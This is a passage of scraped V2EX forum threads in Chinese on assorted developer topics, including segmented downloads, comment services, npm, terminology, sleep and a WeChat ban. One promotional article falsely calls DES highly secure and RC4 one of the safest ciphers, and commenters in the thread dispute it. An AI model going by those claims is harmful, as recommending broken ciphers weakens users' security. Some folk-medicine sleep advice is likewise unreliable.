"代码本身对程序员重要。代码做出来的东西真的很重要么？你换了一家公司，你留下的只是你的经验，做出来的东西和你半毛钱关系都没有", " 如果回答是前者, 造轮子, 研究技术就理所应当了.\r", "\r", "我认为这个问题是没有固定答案的, 就像喜欢红色或绿色.\r", "\r", "有些人之所以当程序员是因为想要创造一些有价值的东西, 做一些有价值的事情, 想要自己动手."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>下载一个 http 文件，文件的前一半用代理 A 下载，后一半用代理 B 下载，通过这样分流提高下载速度。</p>\n<p>如果没有的话可以这样实现：用法类似proxychains，但里面包含一个代理池，round robin分配每一个连接给一个代理。但感觉不会很快。。</p>\n</div></div>"], "reply": "15", "tittle": "有没有这样的下载工具？", "comment": ["自己写，使用 HTTP 的 range header", "大部分下载工具断点续传都是 range ，不支持的一段段慢慢下", "我天，前些天我也有这个想法。\r", "公司给我分配了一个 docker 下的 linux 虚拟机玩，和工作机在局域网中，但是可能运维疏忽了，没有做外网网速限制。\r", "然后自己的工作电脑被限速，下载软件什么的太慢。\r", "就有了和你一样的想法，用 python 写了个小脚本，做分布式下载的实验，读取下载文件响应头的文件长度，然后告诉树莓派和 docker ，用 range 的方法下载，最后把文件拼起来。\r", "后发现这样可以成功，但是因为树莓派在外网，把文件片段返回来还是太久，加上某天 docker 宕机了，不了了之。。", "真是时代的眼泪， flashget 02 年就实现的功能现在的 xx 们连知都不知道了\r", "\r", "\r", " ", "哇塞， 分布式下载", "  aria2c 支持", "可以用来突破网站本身的限速", " 突然想起以前在火狐上用 flashget 配合 uget 和 aria2 。 233", " 以前的软件都是小而美且朴素，重视的是功能，现在的软件都是各种皮肤和广告就占据了半壁江山，讲究的是漂亮的外观和转化率。。\r", "还记得去年有段时间有过凑数的需求，公司有人用 lingo 算了好久，结果一搜多年前就有人用递归算法和 vba 实现了，效率还挺高，分分钟出结果。。", "你是要修理百度网盘吗 O(∩_∩)O", " 快车已经死了很久了吧，传说是因为作者沉迷魔兽", " 哈哈哈哈", " 以前可喜欢看快车下载的那个进度图了，感觉科技感满满哈哈。", " docker 没有被限速直接在 docker 里面下载不就行了？然后局域网传到自己电脑上", " 后来就被限速了"]},
{"content": "", "reply": "11", "tittle": "网站评论有用多说的吗 多说怎么挂了", "comment": ["多说马上要关闭了 ", "\r", "博客用了多说，突然超多的垃圾评论，就意识到不妙", " 博客之前用的是多说，昨天听说多说要关闭了，今天上午就切换到网易云跟帖了，而且还把多说的数据也导进去了，官方说大概 4 个小时就能显示了，结果到现在，数据还没显示出来。", "  我的也是多说，今早切换到云跟贴了，但是能在后台看到消息，但是在网页端显示不出来，你就是把那个 export.json 文件导入进去了吧？这是我的。。。我看你的没显示呢。。。\r", "没人有用搜狐畅言吗？", "如果使用的是 Hexo 的 NexT 的话，可以看看官方文档的第三方服务：\r", "\r", " 畅言要求有 ICP 备案号吧。", " 昨天也转到网易云跟贴了， ", "\r", "数据还没导过来，但发现云跟贴评论框加载好慢，不知道大家用的怎么样？", " 我的也没有显示，在官方的帮助文档中 [ ", " ] 中是这么说的：`注意：数据导入的应是 json 格式，压缩包必须是 zip ，文件大小不能超过 10M ；`，我导入的是.zip 格式，你导入的是.json 格式的，后台都能显示数据，但是前端都没有显示，郁闷！", "一直用新浪微博的评论功能。", "悲剧了 刚才打开多说的后台已经看不到评论数据了\r", "不管是 chrome 还是 firefox 都看不到", "已经换成网易云跟帖了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>LZ ， 33 岁。\n晚上 2 点睡觉， 9 点起床。累得都不行了，尝试着早点睡 12 点左右， 但是很难于入睡，经常在床上看手机 硬是拖到 1 点多。。</p>\n<p>你们都几点睡的？</p>\n</div></div>"], "reply": "12", "tittle": "为啥我一天睡 7 小时还是觉得早上起来特别困？", "comment": ["睡觉不能开灯，哪怕是一个 led ，保持房间绝对黑暗，另外房间要通风，不能关窗又关门。", "这是春困，要祛湿。 连续喝一段时间红豆薏米水（千万别下大米），晚上不要熬夜，最好早上做点运动出身汗，彻底决绝冷饮。过一段时间就好了", "补一个，如果公司有开水，可以自己带点 黄芪片+几粒枸杞子 焖来喝", "过了 11 点睡，第二天会有点困，不管几点起来。\r", "过了 12 点睡，第二天会很困，不管几点起来。\r", "过了 2 点睡，第二天就废了，不管几点起来。\r", "曾经晚上 10 点睡，第二天早上 5 点自然醒，非常精神。\r", "大部分人其实是晨型人，不适合熬夜。", "你缺少一只猫。我家猫贴着我睡的时候第二天起床不会困，要是距离远了，第二天就觉得不够睡", "能量不够", " \r", " \r", "你们两位是开玩笑的吧？一个中医，一个玄学，不知所谓。\r", "\r", "楼主是凌晨 2 点睡的，看清楚是凌晨 2 点，那么晚睡，这种作息习惯就极度不正常了，能不困才怪。而且还是过了 30 的人了，你说 18 22 还估计可以。", "  有这么恐怖嘛，我只是把作息时间往后调了 2 小时， 而且我也睡了 7 小时了。。。。", "跟时间没有关系,跟入睡时间有关,人是自然的一部分,要适应自然", "喝酒，戴眼罩", "早睡，不早睡不行，而且你都 30 多了", "我不同时区工作已经一年了，每天一点半睡，九点起，精神超好"]},
{"content": "", "reply": "3", "tittle": "从安全的角度来讲，密码和用户名可以允许 Unicode 吗？", "comment": ["当然可以，但是很少这么做的原因是有些 unicode 字符很难被用户输入但又有可能被误用。", "不过说实话，对称密码提供的安全已经不可能有什么新的进展了。所以考虑支持什么字符集并没有什么卵用？", " 谢谢～ 可能有的好处也许是可以把密码空间增大那么一点点", " #2 \r", "都是 hash 存储的，空间就跟长度有关"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>但是谷歌还没索引 估计得过一会才能直接出现在搜索结果里。\n还没用上的博友，只需要在 wordpress 里安装官方的 AMP 插件就可以了。\n<a href=\"https://justyy.com/archives/4253/amp\" rel=\"nofollow\">https://justyy.com/archives/4253/amp</a></p>\n</div></div>"], "reply": "1", "tittle": "博客上了 移动 AMP 加速 速度那个快的", "comment": ["快成一道闪电呗，不过无法用 Google 的话，就体现不出来速度的优势。\r", "\r", "给一条链接试试： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 SF 搞了个讲座《前端的自我修养》，</p>\n<ul>\n<li>时间：本周六晚 8 点</li>\n<li>围观地址：<a href=\"https://segmentfault.com/l/1500000008524402\" rel=\"nofollow\">https://segmentfault.com/l/1500000008524402</a></li>\n</ul>\n<p>没空参加的同学，也可以关注下我的微信公众号「小胡子哥」，过两天发文字简版。</p>\n</div></div>"], "reply": "10", "tittle": "在 SF 搞了个讲座《前端的自我修养》，欢迎围观~", "comment": ["看起来不错的。", "看标题以为是 San Francisco.", "实际分享可能会有一点偏差\r", "这样的分享才是坠吼的", "火钳刘明", " 哈哈，列了 PPT 提纲啦，发在讲座下面的讨论区~", "看着不错，今晚参与一下", "小胡子的讲座啊，强势围观。", "前端必备技能，用各种框架写 tolist demo ，写文章，开知乎 live ，开讲座", "支持，欢迎 V2EXer 来参与感兴趣的讲堂 ", "前端必备技能，用各种框架写 tolist demo ，写文章，开知乎 live ，开讲座 hahahahaha"]},
{"content": ["<div class=\"topic_content\">公司的 File Server 要求各文件版本管控，我第一想到的就是 Git ，但无奈无经验积累，來问问看 V 友</div>"], "reply": "10", "tittle": "有没有 File Server+Git 管控读写版本历史的案例？", "comment": ["1.btrfs 定时快照\r", "2.owncloud 等的文件版本", " 1 ，忘记补充了， File Server 是 windows 。", " \r", "\r", "那就 owncloud 呗。\r", "\r", "别自己折腾，容易出妖蛾子", " 不行啦，公司都是域环境的 smb 共享……我就是想要个版本管控这些写入，可以及时的看到谁修改了，修改了什么，并且能回滚。", " \r", "\r", "\r", "\r", "这个？", " 请教。 owncloud 的多版本，是存多份文件？还是增量备份？", "windows Server 2008/2012 自带一个卷影副本功能，可以做定时版本， Windows 10 上叫 文件历史记录。\r", "\r", "“谁修改了”这点需要区分用户或者区分设备，要做认证对接， win 的话大概就是需要上 AD 了。其他方案你得每个人分配用户名。\r", "\r", "“改了什么”这点一些二进制文件只能知道有修改，改了什么还真没办法。如果你使用 git 这种，非文本文件都没办法。\r", "\r", "Office 系列的话你可以看看 SharePoint ，有协作和历史版本功能。", "\"可以及时的看到谁修改了，修改了什么\" 这个做不到。那得 git 这样版本控制系统了。\r", "\r", "可以考虑用 git 现在，有支持 large file 功能了。", "部署一个 gitlab 不行吗？", "gitfs\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我还是之前那个去了化学专业的悲催孩子</p>\n<p>转专业不成\n双学位在研究</p>\n<p>我想弯道超车\n我不想比那群计科的差</p>\n<p>目前在撸高数离散 概率这些东西\n算法也在啃\n还课余用 Django 撸了几个 blog 和论坛  还写了几个爬虫\n以前也做过 iOS APP 之类的东西\n但是学习的都不是很系统</p>\n<p>现在问题来了\n我想弯道超车\n我具体还应该往哪个方向努力呢？！！！！\n（其实都想学  但是总要有个大方向不是？！</p>\n<p>谢谢各位哥哥姐姐了！</p>\n</div></div>", "<div class=\"topic_content\">人生艰难\r<br>但是也总归得加油不是？</div>", "<div class=\"topic_content\">理清思路了！\r<br>全力搞数学 \r<br>那些乱七八糟的 API 搬运员 /玩玩类库的活全当兴趣好了\r<br>\r<br>将来的话 起码还会有化学这条路子走</div>"], "reply": "123", "tittle": "本科非计算机专业 如何弯道超车", "comment": ["翻页，我相信基本功很重要！", "找个女朋友（最重要）", "找个漂亮的女朋友你就超车了，而且是碾压性的超车(逃", " 掉队的对你表示羡慕", "找个女朋友", "弯道超车啊，可以啊，每天编程 16 小时，半年获得被人两年的经验，就超过去了", "保证别翻车就阿弥陀佛了，所以好好加油，每天编程 16 小时，半年获得被人两年的经验，就超过去了", " 这是要引发血战啊", "书中自有黄金屋 下一题", "找个真实生活里的老师带一带", "补理论课吧。举个例子，看网易公开课 MIT 的算法导论，绝对碾压国内 985 的同门课程，然后就是多刷 leetCode 。", "不知道为何要超车？还是超的单车。如果你觉得你喜欢挨踢，而不喜欢化学，摸爬滚打出来后大大小小的挨踢圈子也不一定会完全接纳你。为何不想想当计算机和化学两个学科相互重叠，会碰撞出更多的火花，得到了梦幻一般的幸福世界。计算机可以分析，可以模拟，可以重建，如果你在这些地方付出，难道不比你现在要做的 Blog 、 App 要激情得多么？", "落后就要挨打！", "不知道你学校如何，其实还是看个人", "超不了，因为前车正在超车，。长期加班中😂", "超车主要看车速", "<--------------  这里有个超车成功的, 加油吧", "颜值高的话，就已经超了 80%的计科人啦（误）", "车不一定多好 开的好 直道也能超车！", "要想弯道超车，从不用 python 开始。", "我来说下：上面全错。\r", "1 、学习格斗和搏击\r", "2 、泡妞，从街上搭讪要电话开始\r", "3 、如果你确实爱计算机，就不急不慢稳定走下去足够\r", "\r", "1+2 的能力会让你不断修正 3 ，或许将来你会转而从事其他效益更好的业务。\r", "\r", "我向你保证 1+2 能力所带来的的收益，如果在美国远大于买房，\r", "在中国可以等于 2002 年买房", " 太 6, 我想知道你有没有贯彻第二点, 收益如何", "别听他们扯。\r", "基础永远最重要，弯道超车超一半很轻松的。\r", "学好数学，算法，计算机网络，操作系统。\r", "玩一个 linux 发行版。超越计算机的毕业生分分钟的事。\r", "对于智力本身超你还比你努力的，也别想着弯道超车了。除非拼爹。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目通过 npm 发布到公司 npm 源上后，过段时间发现 npm 上的项目并非自己发布的，而是 github 上的同名项目，不懂 npm 发布 /源相关内容，不知道怎么会产生这样的问题？如果能避免？</p>\n</div></div>"], "reply": "2", "tittle": "公司自己的 npm 源上的项目被 github 上的项目替换", "comment": ["发布到公司 npm 的时候带上 scope 吧", "npm 客服会在各种情况下把包交给别人管理，至于什么情况我不太清楚...\r", "\r", "参考 ", " 这就是一个例子。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从用途上看，应该是念 chong\n但是从英文 overload 上看，貌似是念 zhong ？</p>\n</div></div>", "<div class=\"topic_content\">关于过载（超载）和运算符重载的英文略微考证了一下\r<br>两者都用的是 overload\r<br><a target=\"_blank\" href=\"https://en.wikipedia.org/wiki/Overload\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Overload</a>\r<br>\r<br>不过重载用的是动名词 function overloading 和 operator overloading\r<br>甚至 overloading 还表示国际象棋里用一个棋子看两边，和运算符重载的含义近似\r<br><a target=\"_blank\" href=\"https://en.wikipedia.org/wiki/Overloading\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Overloading</a>\r<br>\r<br>同意 8 楼说法，在 operator overloading 中的 over 和 overwrite ， override 的 over 一样，表示覆盖而不是超过\r<br>所以 chong 比 zhong 更合适</div>"], "reply": "53", "tittle": "\"重载\"，到底是念 chong 还是念 zhong", "comment": ["感觉 reload => 重载， overload => 超载 合适点，读音也确定了。", "个人偏好重(zhòng)，然而也没什么依据……", "overload 就不该译为 重载 吧", "超载 2333", "overload 是过载", "\"当你不确定读 chong 载还是 zhong 载时,就读 zhong 载吧.\"  —— Linus Torvalds ", " ", "从概念上看念 chong ，那就念 chong 。这个词都是用既有词汇表达新概念，但是英语跟汉语在词汇选择上的倾向有所不同，故不必纠结英语原文 overload 。翻译讲究信达雅，纠结于 overload 的原义只是做到了字面意义上的“信”，是为假“信”，读做 chong 才是概念层面的“信”，此乃真“信”。", "chong\r", "\r", "overload 的 over 是类似 overwrite 的 over, 不是 off limit 的 over", "reload 重 chong 新载入\r", "overload 负载过重 zhong", "个人偏好 23333\r", "overload ， chongzai ，重新载入\r", "override ， chongxie ，重新写......", "重(chóng)名但是参数列表不同的函数 /方法，称之为“重载”函数 /方法。\r", "so ，你说呢～", "re- 就是重新的意思啊", "第一次听说 zhong 载这个叫法，是不是还有轻载？", "ch2 声是重复、再次\r", "zh4 声是质量大", "好熟悉的话题", " 这个解释感觉靠谱", "还是直接念英文算了", " 但是， operator overload 怎么翻译，运算符超载？感觉汉语层面上说不通。。。", "嫌麻烦就直接英文啊", "讲真，我觉得这个词译成“覆载”会好些， overwrite 也可以改成\"覆写\"\r", "不过就怕哪天再冒出来个 coverload 啥的，就尴尬了", "overload 译成 重载，那么 reload 译成什么好呢？", "粘贴 应该是 zhan 贴 还是 nian 贴？", " reload 也译重载，联系上下文不难区分说得是 reload 还是 overload 。不同语言的词汇并不一定能一一对应，正如汉语的“生命”和“生活”译成英语都是 life 。", "重载从没见过读 zhòng 的，而且 overload 是过载。", "密钥 应该是 密 yue 还是 密 yao ？", "代码念第二声，卡车念第四声。", "一般来说有争议用的人少的就是对的", "overload 并不是面向编程上常规意义上说的那个 chongzai\r", "\r", "\r", "chongzai 面向对象编程那个词\r", "\r", "而编程接触的英语 overload 的翻译是“过载” 中文对应常用词是超载\r", "\r", "楼主是不是看到编程出现了 “重载这个词” 又在哪里看到了 overload 就联系到一起了", "真的水啊", "坐骑应该是 zuo ji 还是 zuo qi", "大水 B ，有吊你找下一份工作面试时这样读", "我的理解是载--load, 重--over. chong2 更合适", "Overload 应该是过载 炉石已经教会了我们 _(:3)∠*)_", "\r", "overload  重载，重是多重的意思\r", "override 重写，重是覆盖的意思", "为啥感觉这帖子似曾相识 连回答都感觉一样。。。", "载要读 zaì", "Google 翻译的是：\r", "\r", "overload 超载\r", "override 覆盖", " \r", "我没说过这话 —— Linus Torvalds", " 看我给的 wiki 链接。 operator overloading 对应的中文界面：运算符重载", "反正说“ chong ”载大家都听得懂，也符合表现，感觉这个也和密钥（ yao / yue ）一样，语言是交流的工具，当一种读音被广泛的接受的时候那这种读音就变成了正确的读音，就比如荨（ qian ）麻疹一直被误读为（ xun ）麻疹，然后最后官方读音就认可了 xun 为正确的读音，这才是语言正确的发展方式", "（但是 C++的重载绝对是 zhong 载，稍微不注意的话，几百行模板类编译完出来可以有几十 M 东西", " #39 \r", "C++的 overload 这个我个人认为是不良翻译，然后被标准化下来的\r", "\r", "C++之外，中文“重载”是一个面向对象的通用名词(override/overriding)\r", "\r", "\r", "你的主贴拿出来的是“重载”这个词 我们只能从更通用的角度去读", "这也要纠结半天， 99 年， 16 岁，自己学 C++，就已经叫 chong 载了，仔细一想就知道了，一个符号被再次作他用，一个函数也另作他用，不就是重复使用么，无论是 overload 还是 overwrite ，总之是同一个名字重复赋予不同的内涵。所以这里的重点是在于“重复”而不在于同一个名字内涵变沉重。。。", " \"密钥\"读 yue ，还有个词是\"秘钥\"读 yao ，在加密一类的都是前一个词，后一个还没见过使用范围", "我靠，逐词翻译，那是不是应该跟 overflow 统一一下，把 overload 翻译成「溢载」", "这两个读法都有，不是一个意思…\r", "\r", "重（ chong ）载函数\r", "重（ zhong ）载铁路", "密钥的\"钥\"还有讨论读音的价值, 重载的\"重\"一般小学学过多音字的话都不会有疑问啊? point 在哪里?", " ", "说到这个我又想起来当年国内汉化巫师的那个傻逼汉化组了\r", "你要说参考小说(背景小说)翻译成巫师也就算了，居然还是说 Witch 是巫婆 Witcher 就是巫师，结果现在整个 The Witcher 约定俗成的翻译就是巫师...", " \r", "字幕组翻错一两个俚语的现象都很普遍，游戏汉化出错也正常。\r", "但是错的东西一时间没改过来变成了约定俗成的东西就很蛋疼了。。。", "第一次听到 zhong 载这个词", "特别重 zhong 要的重 chong 载", "over 什么意思？\r", "大约应该是在什么之上，覆盖的意思\r", "也有超过的意思\r", "但就是没有 heavy 的意思……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>快搭上 AI 这趟列车吧~</p>\n<p><a href=\"https://www.qcloud.com/community/article/581518001490250627?fromSource=gwzcw.58309.58309.58309\" rel=\"nofollow\">腾讯云总监手把手教你，如何成为 AI 工程师？</a></p>\n</div></div>"], "reply": "4", "tittle": "腾讯云总监手把手教你，如何成为 AI 工程师？", "comment": ["两年前和朋友调侃的 ML 培训班终于有了吗", "标点都用不好， caffe 写成 Caffee ，确定有专业性？", "感觉就是推广云主机的", "市场营销总监吗😆"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1 篇文章， 1 部小说被盗取，全靠维（ si ）权（ bi ）捍卫自己的原创权利。程序员捍卫自己珍贵的代码，全靠花式的加密算法。代码加密有多重要？程序员半年做出的产品，盗版者可能半天就能完全破解。</p>\n<p>加密算法的本质，首先是为了对数据进行保密并防止篡改，其次更具有了身份验证的功能。像是你跟女友约定好的话术，这句话一说出来，她就知道是什么意思，并且知道说话的人是你，但任何其他人根本不知道你们在说什么。</p>\n<p>根据密钥类型的不同，加密算法分为对称和非对称两种。对称加密系统是指加密和解密均采用同一把密钥，就像上文说到的你和女友的小密文，你们互相对对方说“今天月色很美”，对方就明白意思是“我爱你”。非对称密钥则采取加密钥匙和解密要是不同的方式。</p>\n<p>对称加密算法是最常用的加密算法，优势在于算法公开，计算量小，加密效率高。常用的对称加密算法有 DES 、 RC4 、 AES 等。</p>\n<p><img alt=\"1.jpg\" src=\"https://ooo.0o0.ooo/2017/03/23/58d377414def0.jpg\"></p>\n<h3><strong>一、\tDES 算法的优势及应用场景</strong></h3>\n<p><img alt=\"2.jpg\" src=\"https://ooo.0o0.ooo/2017/03/23/58d3778ae9dd3.jpg\"></p>\n<p>定义： DES 算法又被称为美国数据加密标准，是 1972 年美国 IBM 公司研制的对称密码体制加密算法。明文按 64 位进行分组，密钥长 64 位，其中 56 位参与 DES 运算， 8 位为校验位。</p>\n<p>优势： DES 算法具有极高安全性，到目前为止，除了用穷举搜索法对 DES 算法进行攻击外，还没有发现更有效的办法。然而它的缺点是分组短、密钥短、密码生命周期短、运算速度较慢。</p>\n<p>案例： DES 算法最常用的场景是银行业，如银行卡收单，信用卡持卡人的 PIN 的加密传输， IC 卡与 POS 间的双向认证、金融交易数据包的 MAC 校验等，均用到 DES 算法。另外，在 POS 、 ATM 、磁卡及智能卡（ IC 卡）、加油站、高速公路收费站等领域， DES 算法也被广泛应用，以此来实现关键数据的保密。</p>\n<h3><strong>二、\tRC4 算法的优势及应用场景</strong></h3>\n<p><img alt=\"3.jpg\" src=\"https://ooo.0o0.ooo/2017/03/23/58d37a2211145.jpg\"></p>\n<p>定义： RC4 算法作为目前最安全的加密算法之一，在 1987 年被 RSA 三人组中的头号人物罗纳德所创建。密钥长度是可变的，可变范围为 1-256 字节(8-2048 比特)，但一般为 256 字节。</p>\n<p>优势： RC4 算法的特点是算法简单，运行速度快，该算法的速度可以达到 DES 加密的 10 倍左右，且具有很高级别的非线性。</p>\n<p>案例： RC4 算法的运用很广泛，起初是用于保护商业机密，到上世纪九十年代，其算法被发布在互联网中，扩大了使用范围。 App 开发平台 APICloud 将 RC4 算法用于代码加密功能，开发者在平台中编译时可选择这个功能，自动为 Html 、 Javascript 、 Css 代码加密，同时该 App 在运行过程中实时解密， App 退出即焚，不留下解密痕迹。 APICloud 代码加密功能不改变代码量大小，不影响运行效率，针对代码的加密方案不会修改开发者的任何代码，加密后的代码不会比加密前多出一个字节，同时， APICloud 在端底层嵌入了特殊的处理方案，保证代码加密前后， App 的运行效率、使用体验不受影响。</p>\n<p>APICloud 采取先进的动态加解密算法在“二进制”级别进行对称加密，编译一次，仅生效一次，保证了代码的安全，防止代码被反编译，被篡改，被窃取数据，被盗版，保护知识产权。 APICloud 这项加密技术一经推出，切实的为 APICloud 的开发者解决了代码加密的问题，使开发者更放心，更专心。</p>\n<p><a href=\"http://www.apicloud.com\" rel=\"nofollow\">http://www.apicloud.com</a></p>\n<h3><strong>三、\tAES 算法的优势及应用场景</strong></h3>\n<p><img alt=\"4.jpg\" src=\"https://ooo.0o0.ooo/2017/03/23/58d37c644f64d.jpg\"></p>\n<p>定义： AES 算法是高级加密标准的缩写，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的 DES ，已经被多方分析且广为全世界所使用。</p>\n<p>优势： AES 具有比 DES 更好的安全性、效率、灵活性，在软件及硬件上都能快速地加解密，相对来说较易于实作，且只需要很少的存储器。</p>\n<p>案例：使用 AES 算法最著名的是英特尔处理器，也就是说我们每一个人的电脑里都用到了 AES 算法进行加密。英特尔内含的 AES 指令集包含六条指令，据英特尔介绍， AES 指令集让至强处理器更加灵活、高效而安全， E7 处理器可提速 4 倍。</p>\n<h3><strong>四、\t常用加密算法的对比</strong></h3>\n<p>这么多种对称加密算法，那它们之间的区别是什么呢？</p>\n<p><img alt=\"5.png\" src=\"https://ooo.0o0.ooo/2017/03/23/58d37c769461e.png\"></p>\n<p><img alt=\"6.png\" src=\"https://ooo.0o0.ooo/2017/03/23/58d37e479c54d.png\"></p>\n<p>总结一下，无论选择哪种加密算法，最终都是为了保证程序员的代码安全，捍卫自己的产品原创性。最后，编程改变世界！</p>\n</div></div>"], "reply": "30", "tittle": "DES 加密、RC4 加密、AES 加密等加密算法的优势及应用", "comment": ["DES RC4 都是弱加密算法，应淘汰。", "讨论 des 和 rc4 都是骗稿费的\r", "在现在的算力下，这俩的算法构造是否精妙已经没有讨论意义", "对称加密和非对称加密都是可逆的吧？\r", "不可逆加密的是指 Bcrypt 和 sha 之类无需密钥的，我这样理解没问题吧，老铁？", "至少 bcrypt sha256", " ", "加密算法和摘要算法还是有区别吧", " Bcrypt 也是摘要？我见大部分都是说加密算法啊", "使用 AES 算法最著名的是英特尔处理器，也就是说我们每一个人的电脑里都用到了 AES 算法进行加密。 what? 你逗我？ helloworld 还要 AES? Intel 有 AES-NI 加速 AES 操作而已好么\r", " Wiki: bcrypt is a password hashing function...", " 我说的那个 sha256😂", " 考慮一下, 如果把 bcrypt 稱為加密, 那它的解密操作是什麼", "在 2017 年了，还能看到有人说 des 安全……", "现在的软文都想有点干货，但是也别用过时的内容啊。", "我选择 chacha20", "一个软文，连截图都不好好做， exo me ？", "第一段和最后一段有点不明所以的样子……", "明天被老板炒鱿鱼系列～", "原来广告里面也能讨论技术啊", "就这软文，更不敢用你们的产品了。\r", "不发还好……", "这里有多少 SS 用户，估计大多都知道这些加密方式的优劣！", "去百度搜来的？", "非常不相信你们的产品。做的思路就不对。\r", "先不说你们这种什么对于采用什么加密算法的探讨，第一段里说保护程序不破解的方法是加密。黑人问号？？？\r", "程序大致上可以分为服务器端程序和客户端程序。\r", "客户端的程序破解不需要看源码，看函数表，通过 dll 注入等方法绕过授权验证，当然还有脱壳什么的。\r", "服务器端程序，需要做服务器安全措施，比如说防火墙，用户提交字段验证什么的。\r", "你看，没有任何一点和代码加密有关。\r", "再说，就算代码加密了，给其他程序员的话，你肯定要给他明文代码，如果给他加密后的，也肯定会给他解密的 key ，那么他拿到明文照样可以泄露出去。", "好垃圾的软文，鉴定完毕", "垃圾而且错误漏洞百出的软文。\r", "实话实说，第一次听有人说 RC4 是目前最安全的加密算法之一。\r", "你说你软也就罢了，别误导人啊！", "好垃圾的软文，鉴定完毕", "现代加密学应用可以看看\r", "\r", "Crypto101: ", "\r", "Cryptographic Right Answers ： ", "\r", "现代密码学实践指南： 这个随便搜一下就有了", " BCrypt 是给密码做哈希的算法，可以叫加密哈希算法，和加密算法是两回事。", "为何不用 AES ？前面的貌似已经被淘汰了。", "非对称的被楼主吃了么？", "AES 还得对工作模式进行筛选的时代，还在讨论 DES ， RC4 这不是在搞笑，\r", "麻烦先学点现代密码学吧", "难怪我觉得像在看十年前的教材\r", "\r", "“优势： DES 算法具有极高安全性，到目前为止，除了用穷举搜索法对 DES 算法进行攻击外，还没有发现更有效的办法。然而它的缺点是分组短、密钥短、密码生命周期短、运算速度较慢。”\r", "\r", "软件技术基础教程 - Google Books Result\r", "\r", "周肆清, 曹岳辉, 李利明 - ‎ 2005\r", "例如,一个 512 位的密钥被认为是安全的,然而一个由 16 位密钥产生的数据块可能会 立刻被破坏。密钥加密类似于玩 ... 均用到 DES 算法。 DES 算法具有极高的安全性, 到目前为止,除了用穷举搜索法对 DES 算法进行攻击外,还没有发现更有效的办法。", " 你看的这本是十年前抄前人的教材。 DES 算法在 1999 年被首次公开穷举破解"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个很和谐的微信账号 刚刚正在使用 然后莫名其妙被限制登录 理由是被多人投诉并确实有违规行为.<br>\n写这么点不知道会不会被移动~ 不过确实跟程序员有关.<br>\n解封需要一些条件还要验证其他的信息银行卡还有其他的东西 嗯现在正在工作中 很恼火不知道原因气也不知道往哪里撒 我**** 腾讯客服直接不给人工服务  也不知道吐槽消费者协会还是吐槽什么政策还是其他的莫须有的东西</p>\n</div></div>", "<div class=\"topic_content\">理由是“被多人投诉并确实有违规行为”\r<br>一个和谐的老司机，平时做快递，发些单号信息都是工作所用，其他说话骂娘妈卖批，这些能是理由吗...\r<br>多人举报而且违规？ why? 原因？，解封需要他人银行卡信息验证，没有人工客服联系，没有二次审核 申诉途径。\r<br>这就是腾讯 '最受尊敬的互联网企业' '一切以用户价值为依旧'。\r<br>\r<br>\r<br>百度，阿里，腾讯。\r<br>国内各自行业的寡头，中国特色化互联网的支柱。\r<br>百度 百病缠身。\r<br>阿里 嗯还好 。\r<br>腾讯游戏，没钱玩你*，红黄蓝绿紫会员超级会员豪华红钻蓝钻黄钻.....\r<br>\r<br>中国特色化互联网。</div>"], "reply": "59", "tittle": "微信账号莫名被限制登录 腾讯才是中国最大的流氓", "comment": ["全球工单会好一点😏", "问题不大，至少不是直接不给机会封号", " 不知道原因 也无法抗拒 这就是腾讯 一切已用户价值为依旧", "确实有违规行为", "确实有违规行为", "正常  有不流氓的吗？", " \r", "  .. 你们俩 想干嘛", "WX 帐号： hacker\r", "总有那么几天莫名的被冻结，纯被用手机挂着无任何聊天和支付", "月经贴： xxx 流氓，虽然我确实有违规行为，但是 xxx 封我号就是流氓。", " 这个微信给力", "我的倒不是说被投诉有违规行为。\r", "我的一个是买的只绑了微信号的账号，用了大概两个星期吧，就被封了，提示“非法使用软件批量注册”，可惜我只用来看订阅号，大概订阅了十多个号。\r", "另一个用 171 的虚拟号段注册的，第二天就被封了，也是说“非法使用软件批量注册”。\r", "ㄟ，騰訊很機車耶", " 按照 LZ 的描述，那句是腾讯给的理由而不是 LZ 自己的说明吧，还是我理解能力有问题？", " 的确是腾讯给的，但是腾讯会这么说，是不是说腾讯已经（人工）确认过，的确有违规", "月经贴： xxx 流氓，虽然我确实有违规行为，但是 xxx 封我号就是流氓。\r", "+1", " \r", " \r", "又两个不审题目的", "还是加上标点比较好\r", "理由是被多人投诉并确实有违规行为\r", "理由是“被多人投诉”并确实有违规行为\r", "理由是“被多人投诉并确实有违规行为”", " 别说人家了，人家新注册微信号就是哪来约炮嘛，微信附近的人和摇一摇不就搞这个，又搞一个投诉显然腾讯的锅。难道要写上素质约炮嘛。", "腾讯是这样的，机器自动判断然后让你证明无罪。\r", "我的网站 ", " 在任何腾讯系的产品中都报诈骗，腾讯旗下的搜狗浏览器中好像也是。", " 腾讯自己给的理由\r", "\r", " \r", " 请看附言 ,", "我就喜欢看楼主这种违规后被封杀 满脸跳却无可奈何的 BB", "挂路灯", "Google 账号被封了才痛苦。。", "微信账号啥时候允许买卖了！而且买来刷订阅，不封等着过年？", "我就想说俩字\"活该”", "中国最大的流氓 -> 中国互联网最大的流氓", "其实微信封你一点错都没有！\r", "如果你现在举报一个人违规，然后微信没有封那个人，你也会跑到这里来 BB 的。为啥那么多人没有被封过，绝对是自找的。", "微信现在腾讯重点整治，你不是搞点小动作，腾讯也没理由封你账号。", "是不是以后有用户被交警罚款乱停车，也上 V 站发帖，标题:\"停车莫名被罚款， X 国才是世界最大的流氓\"?", "我一个基本没用过的微信号被封了，解封需要身份证号。。。感觉腾讯就是以各种牵强的理由迫使你提供个人信息。然后我就弃了这个帐号，另外注册了个。", "最流氓的是：即使你发这里，并不会有什么腾讯的客服找你 /滑稽", " 长时间不登陆的号，是会被封停 这个你不知道？   哎呦我去。", "微博账号被封的路过，打了一星期客服\r", "Q ：为毛封我号？\r", "A ：违反用户使用协议\r", "Q 